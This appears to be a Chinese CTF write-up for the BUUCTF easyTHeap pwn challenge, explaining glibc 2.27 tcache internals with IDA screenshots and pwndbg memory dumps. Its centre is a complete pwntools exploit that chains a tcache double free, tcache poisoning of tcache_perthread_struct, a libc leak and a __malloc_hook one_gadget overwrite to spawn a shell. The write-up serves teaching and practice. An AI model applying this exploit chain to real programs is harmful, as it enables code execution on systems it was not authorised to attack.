> 参考资料：
>
> [https://www.cnblogs.com/Theffth-blog/p/12790720.html](https://www.cnblogs.com/Theffth-blog/p/12790720.html)
>
> [https://blog.csdn.net/weixin_43833642/article/details/107166551](https://blog.csdn.net/weixin_43833642/article/details/107166551)
>
> 题目来源：BUUCTF-[V&N2020 公开赛]easyTHeap
>
> 附件：
>
> 链接: [https://pan.baidu.com/s/1T1pV_mbUEPXCg-vlu_Yw7w](https://pan.baidu.com/s/1T1pV_mbUEPXCg-vlu_Yw7w)  密码: 5fnk
>
> --来自百度网盘超级会员V3的分享
>
> **<font style="color:#F5222D;">待整合</font>**[**<font style="color:#F5222D;">https://www.cnblogs.com/Theffth-blog/p/12790720.html</font>**](https://www.cnblogs.com/Theffth-blog/p/12790720.html)**<font style="color:#F5222D;">文章中的内容</font>**
>

# 前言
由于CTF-wiki上没有例子，因此我们直接拿题目来说明。

<font style="color:#000000;">在堆题中，我们常见的一种泄露地址的方法是泄露</font>`unsortedbin`<font style="color:#000000;">中chunk的</font>`fd`<font style="color:#000000;">和</font>`bk`<font style="color:#000000;">，而在严格限制chunk大小的堆题中，如果有</font>`tcache`<font style="color:#000000;">机制的影响，我们必须需要先将</font>`tcache Bin`<font style="color:#000000;">填满，才能把chunk放入</font>`unsortedbin`<font style="color:#000000;">中，再进行地址泄露。于是，有些堆题会对</font>`malloc`<font style="color:#000000;">和</font>`free`<font style="color:#000000;">操作的次数设定限制，这时我们可以考虑伪造</font>`tcache`<font style="color:#000000;">机制的主体</font>`tcache_perthread_struct`<font style="color:#000000;">结构体。在源代码中对其定义如下：</font>

> libc-2.27.so
>

```c
#glibc-malloc源码中的第2902-2921行
/* We overlay this structure on the user-data portion of a chunk when
   the chunk is stored in the per-thread cache.  */
typedef struct tcache_entry
{
  struct tcache_entry *next;//指向的下一个chunk的next字段
} tcache_entry;

/* There is one of these for each thread, which contains the
   per-thread cache (hence "tcache_perthread_struct").  Keeping
   overall size low is mildly important.  Note that COUNTS and ENTRIES
   are redundant (we could have just counted the linked list each
   time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];//数组长度64，每个元素最大为0x7，仅占用一个字节（对应64个tcache链表）
  tcache_entry *entries[TCACHE_MAX_BINS];//entries指针数组（对应64个tcache链表，cache bin中最大为0x400字节
  //每一个指针指向的是对应tcache_entry结构体的地址。
} tcache_perthread_struct;

static __thread bool tcache_shutting_down = false;
static __thread tcache_perthread_struct *tcache = NULL;
```

从上面可以看到：`tcache_perthread_struct`<font style="color:#000000;">结构体首先是类型为char（一个字节）的counts数组，用于存放64个bins中的chunk数量，随后依次是对应size大小</font>`0x20-0x400`<font style="color:#000000;">的64个entries（8个字节），用于存放64个bins的Bin头地址。</font>

# Linux环境
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606984482581-d7a44660-925d-4b2f-b479-df108f3d0eec.png)

# 文件保护
首先先来看一下文件的保护情况：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606984640379-ebbaee54-3f49-4405-a33b-62ce6fe0945c.png)

程序的保护全开，难受。。。

# IDA静态分析
题目下载下来之后，对其进行静态分析：

## sub_A39()--init
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606985154169-0a94df68-6013-449a-b483-268b88a36def.png)

这个函数里面包含着许多函数，绝大部分都是初始化内存函数。

但是里面有个alarm函数，这会干扰我们之后的动态调试，根据下图的机器码在hex编辑器里寻找其对应的位置进行patch：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606985302014-7576a185-4e38-4c60-b0b9-92f25b58e62e.png)



patch之后的效果如下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606986698341-af5db191-9b1c-4bcc-9dbe-5c18f259026d.png)、

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606986778453-686d2bbf-8441-4c0c-a3c4-7d7a730739e4.png)

根据这个程序，不妨我们将sub_a39函数重命名为init_func（初始化）。

## sub_DCF()--menu
这个函数是程序的菜单函数，我们将其重命名为menu：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606987048956-81091b9e-bef3-4363-bb1a-2ea6b7cbab94.png)

## sub_9EA()--input_func
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606987134485-4c5dcb8f-cc86-45be-b9de-e61ec5b37b80.png)

没有什么好说的，程序会根据输入来执行对应的功能，将其重命名为input_func

## 1、sub_AFF()--add
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606988115361-8e47635c-f7b1-4ad8-9b6f-d845432ecd57.png)

## 2、sub_BEA()--edit
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606988539573-0d49769d-45e1-4f87-9d7d-3a2cba80d51f.png)

## 3、sub_CA4()--show
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606988705933-27870240-ec87-4ed4-907b-8dd54eeeaee8.png)

## 4、sub_D2C()--delete
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606989502706-fbe5c702-9650-460b-b67a-e7eade49b934.png)

## main函数
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606989026600-0a45336d-9f51-47a3-a5d6-6534ec0a669f.png)

# pwndbg动态调试
首先关闭系统的ALSR：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1607063044671-0d62bf92-cac4-4ff4-8a10-5acb319efb5b.png)

验证一下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1607063069422-3fd34668-9a33-42c1-905a-fb447485884f.png)

两次地址不再发生改变，说明程序运行时的PIE保护已经无效。

动态调试主要确定一下IDA中bss段全局变量和data段中变量具体的所在位置，开始gdb调试程序：

先来确定一下data段中free_count和malloc_count的位置：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1607063464342-8cc0a990-618d-4c1d-bd78-8dd155adbdb6.png)

下面是程序运行时内存的分布情况：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1607063501231-b02f1782-fd14-4e09-8705-613f8c09cded.png)

由于这两个变量存在于data段，在内存中对应一下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1607063580418-6f85ae4e-4fbc-46f7-8199-2d25493e98ee.png)![](https://cdn.nlark.com/yuque/0/2020/png/574026/1607063608267-aec47f9e-dc09-4878-ba0f-3b99d542a79f.png)

图中白色地方的数据就是free_count和malloc_count

接下来我们创建三个chunk（这里输入的大小为10,40,80），寻找一下chunk_input_size和malloc_data_ptr在内存中所处的位置，寻找结果如下：

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x555555757250
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x555555757270
Size: 0x31

Allocated chunk | PREV_INUSE
Addr: 0x5555557572a0
Size: 0x61

Top chunk | PREV_INUSE
Addr: 0x555555757300
Size: 0x20d01

pwndbg> x/200gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
.......(省略内容均为空)
0x555555757250:	0x0000000000000000	0x0000000000000021 #chunk1
0x555555757260:	0x0000000000000000	0x0000000000000000
0x555555757270:	0x0000000000000000	0x0000000000000031 #chunk2
0x555555757280:	0x0000000000000000	0x0000000000000000
0x555555757290:	0x0000000000000000	0x0000000000000000
0x5555557572a0:	0x0000000000000000	0x0000000000000061 #chunk3
.......(省略内容均为空)
0x555555757300:	0x0000000000000000	0x0000000000020d01 #top_chunk
.......(省略内容均为空)
0x555555757630:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

从上面可以得到，chunk1的data指针所指向的地址为0x555555757260，对应一下内存：

```c
pwndbg> x/16gx 0x555555756060
0x555555756060:	0x000000280000000a	0x0000000000000050 #chunk_input_size
    			#size2    #size1              #size3
0x555555756070:	0x0000000000000000	0x0000000000000000
0x555555756080:	0x0000555555757260	0x0000555555757280 #malloc_data_ptr
    			#chunk1_data_ptr    #chunk2_data_ptr
0x555555756090:	0x00005555557572b0	0x0000000000000000
    			#chunk3_data_ptr
0x5555557560a0:	0x0000000000000000	0x0000000000000000
0x5555557560b0:	0x0000000000000000	0x0000000000000000
0x5555557560c0:	0x0000000000000000	0x0000000000000000
0x5555557560d0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

# exp
先贴一下exp：

```python
#! /usr/bin/env python
from pwn import *

p = process('./vn_pwn_easyTHeap_patch')
#p = remote('node3.buuoj.cn', 25389)
elf = ELF('./vn_pwn_easyTHeap_patch')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def new(size):
    p.sendlineafter('choice: ', '1')
    p.sendlineafter('size?', str(size))

def edit(index, content):
    p.sendlineafter('choice: ', '2')
    p.sendlineafter('idx?', str(index))
    p.sendlineafter('content:', content)

def show(index):
    p.sendlineafter('choice: ', '3')
    p.sendlineafter('idx?', str(index))

def delete(index):
    p.sendlineafter('choice: ', '4')
    p.sendlineafter('idx?', str(index))

new(0x50) #0
delete(0)
delete(0)
show(0)
heap_base = u64(p.recvuntil('\n', drop = True).ljust(8, '\x00'))
print hex(heap_base)
new(0x50) #1
edit(1, p64(heap_base - 0x250))
new(0x50) #2
new(0x50) #3
edit(3, 'a' * 0x28)
delete(3)
show(3)
libc_base = u64(p.recvuntil('\n', drop = True).ljust(8, '\x00')) - 0x3ebca0
print hex(libc_base)
malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + libc.sym['__libc_realloc']
one_gadget=[0x4f365,0x4f3c2,0x10a45c]
one = libc_base + one_gadget[2]
new(0x50)
edit(4, 'b' * 0x48 +  p64(malloc_hook - 0x13))
new(0x20)
edit(5, '\x00' * (0x13 - 0x8) + p64(one) + p64(realloc + 8))
new(0x10)
p.sendline('ls')
p.interactive()
```

## 泄露堆地址
由于程序开启了PIE保护，因此首先我们利用tcache_bin_attack中的Tcache dup漏洞对创建的堆块进行多次free，打印堆块内容是就会打印出heap地址：

```python
new(0x50) #0
delete(0)
delete(0)
show(0)
heap_base = u64(p.recvuntil('\n', drop = True).ljust(8, '\x00'))
print hex(heap_base)
```

执行此段payload后：

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x251

Free chunk (tcache) | PREV_INUSE
Addr: 0x555555757250
Size: 0x61
fd: 0x555555757260

Top chunk | PREV_INUSE
Addr: 0x5555557572b0
Size: 0x20d51

pwndbg> x/100gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
0x555555757010:	0x0000000200000000	0x0000000000000000
.......(省略内容均为空)
0x555555757070:	0x0000555555757260	0x0000000000000000
.......(省略内容均为空)
0x555555757250:	0x0000000000000000	0x0000000000000061 #chunk0
0x555555757260:	0x0000555555757260	0x0000000000000000
.......(省略内容均为空)
0x5555557572b0:	0x0000000000000000	0x0000000000020d51 #top_chunk
.......(省略内容均为空)
0x555555757310:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx 0x555555756060
0x555555756060:	0x0000000000000000	0x0000000000000000
    			#这里没有数据是因为在free此堆块时，程序将其size置0
                #具体请参考IDA伪代码
0x555555756070:	0x0000000000000000	0x0000000000000000
0x555555756080:	0x0000555555757260	0x0000000000000000
    			#UAF，chunk1_data_ptr
0x555555756090:	0x0000000000000000	0x0000000000000000
0x5555557560a0:	0x0000000000000000	0x0000000000000000
0x5555557560b0:	0x0000000000000000	0x0000000000000000
0x5555557560c0:	0x0000000000000000	0x0000000000000000
0x5555557560d0:	0x0000000000000000	0x0000000000000000
pwndbg> bin
tcachebins
0x60 [  2]: 0x555555757260 ◂— 0x555555757260 /* '`ruUUU' */
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> 
```

**<font style="color:#F5222D;">由于UAF漏洞的存在，chunk_data指针没有置空，因此可以进行多次free。</font>**

> exp中的heap_base其实指的是泄露出来的堆地址，而并非堆基地址
>
> heap_base=0x555555757260
>

## 利用Tcache_poisoning控制tcache_perthread_struct
```python
new(0x50) #1
edit(1, p64(heap_base - 0x250))
```

如上面所示，我们可以利用tcache_poisoning更改堆块的next指针，首先先创建了一个chunk：

```python
new(0x50) #1
```

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x251

Free chunk (tcache) | PREV_INUSE
Addr: 0x555555757250
Size: 0x61
fd: 0x555555757260

Top chunk | PREV_INUSE
Addr: 0x5555557572b0
Size: 0x20d51

pwndbg> bin
tcachebins
0x60 [  1]: 0x555555757260 ◂— 0x555555757260 /* '`ruUUU' */
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> x/100gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
0x555555757010:	0x0000000100000000	0x0000000000000000
    			#tcache_count
.......(省略内容均为空)
0x555555757070:	0x0000555555757260	0x0000000000000000
.......(省略内容均为空)
0x555555757250:	0x0000000000000000	0x0000000000000061 #chunk0(chunk1)
0x555555757260:	0x0000555555757260	0x0000000000000000
.......(省略内容均为空)
0x5555557572b0:	0x0000000000000000	0x0000000000020d51 #top_chunk
.......(省略内容均为空)
0x555555757310:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx 0x555555756060
0x555555756060:	0x0000005000000000	0x0000000000000000
    			#size1=0x50
0x555555756070:	0x0000000000000000	0x0000000000000000
0x555555756080:	0x0000555555757260	0x0000555555757260
    			#chunk0_data_ptr    #chunk1_data_ptr
    			#两个指针相同的原因是之前的Tcache dup导致的
0x555555756090:	0x0000000000000000	0x0000000000000000
0x5555557560a0:	0x0000000000000000	0x0000000000000000
0x5555557560b0:	0x0000000000000000	0x0000000000000000
0x5555557560c0:	0x0000000000000000	0x0000000000000000
0x5555557560d0:	0x0000000000000000	0x0000000000000000
pwndbg> 

```

由于之前tcache中有两个free_chunk（实际上是同一个），因此申请的空间从tcache_bin中移出，这就造成了tcachebins中现在的free_chunk只有一个，但是这个free_chunk和移出的chunk是同一个堆块。so，这个chunk仍然处于存在next指针。

```python
edit(1, p64(heap_base - 0x250))
```

然后编辑这个chunk中的next指针，结果如下所示：

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x251

Free chunk (tcache) | PREV_INUSE
Addr: 0x555555757250
Size: 0x61
fd: 0x555555757010

Top chunk | PREV_INUSE
Addr: 0x5555557572b0
Size: 0x20d51

pwndbg> x/100gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
0x555555757010:	0x0000000100000000	0x0000000000000000
.......(省略内容均为空)
0x555555757070:	0x0000555555757260	0x0000000000000000
.......(省略内容均为空)
0x555555757250:	0x0000000000000000	0x0000000000000061 #chunk0（chunk1）
0x555555757260:	0x0000555555757010	0x000000000000000a
    			#next指针已被修改
    			#现在指向tcache_perthread_struct_data
.......(省略内容均为空)
0x5555557572b0:	0x0000000000000000	0x0000000000020d51 #top_chunk
.......(省略内容均为空)
0x555555757310:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx 0x555555756060
0x555555756060:	0x0000005000000000	0x0000000000000000
0x555555756070:	0x0000000000000000	0x0000000000000000
0x555555756080:	0x0000555555757260	0x0000555555757260
0x555555756090:	0x0000000000000000	0x0000000000000000
0x5555557560a0:	0x0000000000000000	0x0000000000000000
0x5555557560b0:	0x0000000000000000	0x0000000000000000
0x5555557560c0:	0x0000000000000000	0x0000000000000000
0x5555557560d0:	0x0000000000000000	0x0000000000000000
pwndbg> bin
tcachebins
0x60 [  1]: 0x555555757260 —▸ 0x555555757010 ◂— ...
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> 
```

## 申请tcache_perthread_struct内存
```c
new(0x50) #2
new(0x50) #3
```

创建2个chunk之后就会完全控制tcache_perthread_struct，结果如下所示：

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x555555757250
Size: 0x61

Top chunk | PREV_INUSE
Addr: 0x5555557572b0
Size: 0x20d51

pwndbg> x/100gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
0x555555757010:	0x000000ff00000000	0x0000000000000000
    			#tcache_count=-1=0xff
.......(省略内容均为空)
0x555555757250:	0x0000000000000000	0x0000000000000061 #chunk0（chunk1）
0x555555757260:	0x0000555555757010	0x000000000000000a
.......(省略内容均为空)
0x5555557572b0:	0x0000000000000000	0x0000000000020d51
.......(省略内容均为空)
0x555555757310:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx 0x555555756060
0x555555756060:	0x0000005000000000	0x0000005000000050
0x555555756070:	0x0000000000000000	0x0000000000000000
0x555555756080:	0x0000555555757260	0x0000555555757260
				#chunk0_data_ptr    #chunk1_data_ptr
0x555555756090:	0x0000555555757260	0x0000555555757010
       #chunk1_data_ptr(malloc所致)  #tcache_perthread_struct_data
0x5555557560a0:	0x0000000000000000	0x0000000000000000
0x5555557560b0:	0x0000000000000000	0x0000000000000000
0x5555557560c0:	0x0000000000000000	0x0000000000000000
0x5555557560d0:	0x0000000000000000	0x0000000000000000
pwndbg> bin
tcachebins
0x60 [ -1]: 0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> 
```

从上面可以看到，申请两个堆块完成之后，tcachebins中的0x60链的数目变为-1（0xff）。由于它是无符号的，因此负数将被解释为一个较大的正数（在这种情况下，可能是0xff），这将使该tcache bin似乎已满。这将阻止我们进行tcache_poisoning。

> [https://faraz.faith/2019-10-20-secconctf-2019-one/](https://faraz.faith/2019-10-20-secconctf-2019-one/)
>

---

假如说tcache是这样的：

0x?? [  1]: chunk1_data_addr —▸ chunk2_data_addr ◂— ...

那么malloc两次之后，将会申请chunk2_data_addr的内存：

0x?? [ -1]: 0

可以得出一个猜测：

若chunk1_data_addrde next指针指向的是一个有效并且合法的内存地址，当第二次malloc时，会申请到chunk2_data_addr的地址，无论在malloc后其链对应的tcache_bin_count为-1（0xff）

---

```c
edit(3, 'a' * 0x28)
```

接下来向其中写入padding

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x555555757250
Size: 0x61

Top chunk | PREV_INUSE
Addr: 0x5555557572b0
Size: 0x20d51

pwndbg> x/100gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
0x555555757010:	0x6161616161616161	0x6161616161616161
0x555555757020:	0x6161616161616161	0x6161616161616161
0x555555757030:	0x6161616161616161	0x000000000000000a
.......(省略内容均为空)
0x555555757250:	0x0000000000000000	0x0000000000000061
0x555555757260:	0x0000555555757010	0x000000000000000a
.......(省略内容均为空)
0x5555557572b0:	0x0000000000000000	0x0000000000020d51 #top_chunk
.......(省略内容均为空)
0x555555757310:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx 0x555555756060
0x555555756060:	0x0000005000000000	0x0000005000000050
0x555555756070:	0x0000000000000000	0x0000000000000000
0x555555756080:	0x0000555555757260	0x0000555555757260
0x555555756090:	0x0000555555757260	0x0000555555757010
    								#chunk3
0x5555557560a0:	0x0000000000000000	0x0000000000000000
0x5555557560b0:	0x0000000000000000	0x0000000000000000
0x5555557560c0:	0x0000000000000000	0x0000000000000000
0x5555557560d0:	0x0000000000000000	0x0000000000000000
pwndbg> bin
tcachebins
0x20 [ 97]: 0x0
0x30 [ 97]: 0x0
0x40 [ 97]: 0x0
0x50 [ 97]: 0x0
0x60 [ 97]: 0x0
0x70 [ 97]: 0x0
0x80 [ 97]: 0x0
0x90 [ 97]: 0x0
0xa0 [ 97]: 0x0
0xb0 [ 97]: 0x0
0xc0 [ 97]: 0x0
0xd0 [ 97]: 0x0
0xe0 [ 97]: 0x0
0xf0 [ 97]: 0x0
0x100 [ 97]: 0x0
0x110 [ 97]: 0x0
0x120 [ 97]: 0x0
0x130 [ 97]: 0x0
0x140 [ 97]: 0x0
0x150 [ 97]: 0x0
0x160 [ 97]: 0x0
0x170 [ 97]: 0x0
0x180 [ 97]: 0x0
0x190 [ 97]: 0x0
0x1a0 [ 97]: 0x0
0x1b0 [ 97]: 0x0
0x1c0 [ 97]: 0x0
0x1d0 [ 97]: 0x0
0x1e0 [ 97]: 0x0
0x1f0 [ 97]: 0x0
0x200 [ 97]: 0x0
0x210 [ 97]: 0x0
0x220 [ 97]: 0x0
0x230 [ 97]: 0x0
0x240 [ 97]: 0x0
0x250 [ 97]: 0x0
0x260 [ 97]: 0x0
0x270 [ 97]: 0x0
0x280 [ 97]: 0x0
0x290 [ 97]: 0x0
0x2a0 [ 10]: 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> 
```

写入padding会覆盖tcache_count所在的地方，从而导致上面那种情况。

## <font style="color:#000000;">泄露libc地址</font>
```python
delete(3)
show(3)
```

<font style="color:#000000;">当我们释放</font>tcache_perthread_struct之后，这个chunk就会进入unsortedbin中：

> 放入unsorted bin中的原因是tcachebin已满且tcache_perthread_struct大小不属于fastbin。
>

执行之后的内存：

```c
pwndbg> heap
Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x555555757000
Size: 0x251
fd: 0x7ffff7dcfca0
bk: 0x7ffff7dcfca0

Allocated chunk
Addr: 0x555555757250
Size: 0x60

Top chunk | PREV_INUSE
Addr: 0x5555557572b0
Size: 0x20d51

pwndbg> x/100gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
0x555555757010:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
    			#tcache_count_所在位置
0x555555757020:	0x6161616161616161	0x6161616161616161
0x555555757030:	0x6161616161616161	0x000000000000000a
.......(省略内容均为空)
0x555555757250:	0x0000000000000250	0x0000000000000060 #chunk
0x555555757260:	0x0000555555757010	0x000000000000000a
0x555555757270:	0x0000000000000000	0x0000000000000000
0x555555757280:	0x0000000000000000	0x0000000000000000
0x555555757290:	0x0000000000000000	0x0000000000000000
0x5555557572a0:	0x0000000000000000	0x0000000000000000
0x5555557572b0:	0x0000000000000000	0x0000000000020d51 #top_chunk
.......(省略内容均为空)
0x555555757310:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx 0x555555756060
0x555555756060:	0x0000005000000000	0x0000000000000050
0x555555756070:	0x0000000000000000	0x0000000000000000
0x555555756080:	0x0000555555757260	0x0000555555757260
0x555555756090:	0x0000555555757260	0x0000555555757010
.......(省略内容均为空)
0x5555557560d0:	0x0000000000000000	0x0000000000000000
pwndbg> bin
tcachebins
0x20 [-96]: 0x0
0x30 [ -4]: 0x0
0x40 [-36]: 0x0
0x50 [ -9]: 0x0
0x60 [ -1]: 0
0x70 [127]: 0x0
0xa0 [-96]: 0x0
0xb0 [ -4]: 0x0
0xc0 [-36]: 0x0
0xd0 [ -9]: 0x0
0xe0 [ -1]: 0
0xf0 [127]: 0x0
0x120 [ 97]: 0x0
0x130 [ 97]: 0x0
0x140 [ 97]: 0x0
0x150 [ 97]: 0x0
0x160 [ 97]: 0x0
0x170 [ 97]: 0x0
0x180 [ 97]: 0x0
0x190 [ 97]: 0x0
0x1a0 [ 97]: 0x0
0x1b0 [ 97]: 0x0
0x1c0 [ 97]: 0x0
0x1d0 [ 97]: 0x0
0x1e0 [ 97]: 0x0
0x1f0 [ 97]: 0x0
0x200 [ 97]: 0x0
0x210 [ 97]: 0x0
0x220 [ 97]: 0x0
0x230 [ 97]: 0x0
0x240 [ 97]: 0x0
0x250 [ 97]: 0x0
0x260 [ 97]: 0x0
0x270 [ 97]: 0x0
0x280 [ 97]: 0x0
0x290 [ 97]: 0x0
0x2a0 [ 10]: 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x555555757000 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757000
smallbins
empty
largebins
empty
pwndbg> 
```

这样就可以得到libc的地址。

## 泄露libc的基地址
```python
libc_base = u64(p.recvuntil('\n', drop = True).ljust(8, '\x00')) - 0x3ebca0
print hex(libc_base)
malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + libc.sym['__libc_realloc']
one_gadget=[0x4f365,0x4f3c2,0x10a45c]
one = libc_base + one_gadget[2]
```

这里不在多说，计算出了__malloc_hook、__libc_realloc、one_gadget的地址。

## 创建堆块，向其中写入__malloc_hook
```python
new(0x50) #4
edit(4, 'b' * 0x48 +  p64(malloc_hook - 0x13))
```

```python
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x61

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x555555757060
Size: 0x1f1
fd: 0x7ffff7dcfca0
bk: 0x7ffff7dcfca0

Allocated chunk
Addr: 0x555555757250
Size: 0x60

Top chunk | PREV_INUSE
Addr: 0x5555557572b0
Size: 0x20d51

pwndbg> x/100gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000061 #new_malloc_chunk
    												   #new_tcache_perthread_struct
0x555555757010:	0x6262626262626262	0x6262626262626262
0x555555757020:	0x6262626262626262	0x6262626262626262
0x555555757030:	0x6262626262626262	0x6262626262626262
0x555555757040:	0x6262626262626262	0x6262626262626262
0x555555757050:	0x6262626262626262	0x00007ffff7dcfc1d
    								#malloc_hook - 0x13
0x555555757060:	0x0000000000000000	0x00000000000001f1 #old_tcache_perthread_struct
0x555555757070:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
------------------------------------------------------------------------------
看到上面内存中所标注的吗？
在创建这个堆块之前tcache_perthread_struct已经被放入到了unsortedbin中了，
由于此时tcache、fast、smallbin中均没有空闲的chunk，而unsortedbin正好有，
因此malloc出的堆块是从unosortedbin中进行切割，新malloc出的chunk在
原来tcache_perthread_struct的位置，现在它已经成为新的tcache_perthread_struct
0x00007ffff7dcfc1d正好是tcache 0x30链所处的位置，理所当然的出现在了
tcache bin 0x30链中。
------------------------------------------------------------------------------
.......(省略内容均为空)
0x555555757250:	0x00000000000001f0	0x0000000000000060 #chunk
0x555555757260:	0x0000555555757010	0x000000000000000a
0x555555757270:	0x0000000000000000	0x0000000000000000
0x555555757280:	0x0000000000000000	0x0000000000000000
0x555555757290:	0x0000000000000000	0x0000000000000000
0x5555557572a0:	0x0000000000000000	0x0000000000000000
0x5555557572b0:	0x0000000000000000	0x0000000000020d51 #top_chunk
.......(省略内容均为空)
0x555555757310:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx 0x555555756060
0x555555756060:	0x0000005000000000	0x0000000000000050
0x555555756070:	0x0000000000000050	0x0000000000000000
0x555555756080:	0x0000555555757260	0x0000555555757260
0x555555756090:	0x0000555555757260	0x0000555555757010
0x5555557560a0:	0x0000555555757010	0x0000000000000000
.......(省略内容均为空)
0x5555557560d0:	0x0000000000000000	0x0000000000000000
pwndbg> bin
tcachebins
0x20 [ 98]: 0x6262626262626262 ('bbbbbbbb')
0x30 [ 98]: 0x7ffff7dcfc1d ◂— 0xfff7a7b480000000
0x40 [ 98]: 0x0
0x50 [ 98]: 0x1f1
0x60 [ 98]: 0x7ffff7dcfca0 (main_arena+96) —▸ 0x5555557572b0 ◂— 0x0
0x70 [ 98]: 0x7ffff7dcfca0 (main_arena+96) —▸ 0x5555557572b0 ◂— 0x0
0x80 [ 98]: 0x0
0x90 [ 98]: 0x0
0xa0 [ 98]: 0x0
0xb0 [ 98]: 0x0
0xc0 [ 98]: 0x0
0xd0 [ 98]: 0x0
0xe0 [ 98]: 0x0
0xf0 [ 98]: 0x0
0x100 [ 98]: 0x0
0x110 [ 98]: 0x0
0x120 [ 98]: 0x0
0x130 [ 98]: 0x0
0x140 [ 98]: 0x0
0x150 [ 98]: 0x0
0x160 [ 98]: 0x0
0x170 [ 98]: 0x0
0x180 [ 98]: 0x0
0x190 [ 98]: 0x0
0x1a0 [ 98]: 0x0
0x1b0 [ 98]: 0x0
0x1c0 [ 98]: 0x0
0x1d0 [ 98]: 0x0
0x1e0 [ 98]: 0x0
0x1f0 [ 98]: 0x0
0x200 [ 98]: 0x0
0x210 [ 98]: 0x0
0x220 [ 98]: 0x0
0x230 [ 98]: 0x0
0x240 [ 98]: 0x0
0x250 [ 98]: 0x0
0x260 [ 98]: 0x0
0x270 [ 98]: 0x0
0x280 [ 98]: 0x0
0x290 [ 98]: 0x0
0x2a0 [ 98]: 0x0
0x2b0 [ 98]: 0x0
0x2c0 [ 98]: 0x0
0x2d0 [ 98]: 0x0
0x2e0 [ 98]: 0x0
0x2f0 [ 98]: 0x0
0x300 [ 98]: 0x0
0x310 [ 98]: 0x0
0x320 [ 98]: 0x0
0x330 [ 98]: 0x0
0x340 [ 98]: 0x0
0x350 [ 98]: 0x0
0x360 [ 98]: 0x0
0x370 [ 98]: 0x0
0x380 [ 98]: 0x0
0x390 [ 98]: 0x0
0x3a0 [ 98]: 0x0
0x3b0 [ 98]: 0x0
0x3c0 [ 98]: 0x0
0x3d0 [ 98]: 0x0
0x3e0 [ 98]: 0x0
0x3f0 [ 98]: 0x0
0x400 [ 98]: 0x0
0x410 [ 98]: 0x0
fastbins
0x20: 0x0
0x30: 0x0
